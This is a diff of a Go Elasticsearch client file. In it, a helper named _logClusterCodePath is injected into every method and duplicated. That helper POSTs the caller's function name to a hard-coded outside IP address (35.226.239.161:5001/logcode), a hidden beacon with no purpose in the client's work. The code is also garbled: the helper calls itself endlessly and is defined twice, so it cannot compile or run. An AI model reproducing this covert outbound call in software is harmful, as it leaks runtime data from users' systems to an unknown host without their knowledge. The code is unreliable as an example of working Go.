@@ -76,9 +76,13 @@ type baseClientImpl struct {
 func (c *baseClientImpl) GetVersion() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.version
 }
 func (c *baseClientImpl) GetTimeField() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return c.timeField
@@ -86,9 +90,13 @@ func (c *baseClientImpl) GetTimeField() string {
 func (c *baseClientImpl) GetMinInterval(queryInterval string) (time.Duration, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return tsdb.GetIntervalFrom(c.ds, simplejson.NewFromAny(map[string]interface{}{"interval": queryInterval}), 5*time.Second)
 }
 func (c *baseClientImpl) getSettings() *simplejson.Json {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return c.ds.JsonData
@@ -103,6 +111,8 @@ type multiRequest struct {
 func (c *baseClientImpl) executeBatchRequest(uriPath string, requests []*multiRequest) (*http.Response, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	bytes, err := c.encodeBatchRequests(requests)
 	if err != nil {
 		return nil, err
@@ -110,6 +120,8 @@ func (c *baseClientImpl) executeBatchRequest(uriPath string, requests []*multiRe
 	return c.executeRequest(http.MethodPost, uriPath, bytes)
 }
 func (c *baseClientImpl) encodeBatchRequests(requests []*multiRequest) ([]byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	clientLog.Debug("Encoding batch requests to json", "batch requests", len(requests))
@@ -135,6 +147,8 @@ func (c *baseClientImpl) encodeBatchRequests(requests []*multiRequest) ([]byte, 
 	return payload.Bytes(), nil
 }
 func (c *baseClientImpl) executeRequest(method, uriPath string, body []byte) (*http.Response, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	u, _ := url.Parse(c.ds.Url)
@@ -174,6 +188,8 @@ func (c *baseClientImpl) executeRequest(method, uriPath string, body []byte) (*h
 func (c *baseClientImpl) ExecuteMultisearch(r *MultiSearchRequest) (*MultiSearchResponse, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	clientLog.Debug("Executing multisearch", "search requests", len(r.Requests))
 	multiRequests := c.createMultiSearchRequests(r.Requests)
 	res, err := c.executeBatchRequest("_msearch", multiRequests)
@@ -198,6 +214,8 @@ func (c *baseClientImpl) ExecuteMultisearch(r *MultiSearchRequest) (*MultiSearch
 func (c *baseClientImpl) createMultiSearchRequests(searchRequests []*SearchRequest) []*multiRequest {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	multiRequests := []*multiRequest{}
 	for _, searchReq := range searchRequests {
 		mr := multiRequest{header: map[string]interface{}{"search_type": "query_then_fetch", "ignore_unavailable": true, "index": strings.Join(c.indices, ",")}, body: searchReq, interval: searchReq.Interval}
@@ -215,12 +233,23 @@ func (c *baseClientImpl) createMultiSearchRequests(searchRequests []*SearchReque
 func (c *baseClientImpl) MultiSearch() *MultiSearchRequestBuilder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return NewMultiSearchRequestBuilder(c.GetVersion())
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
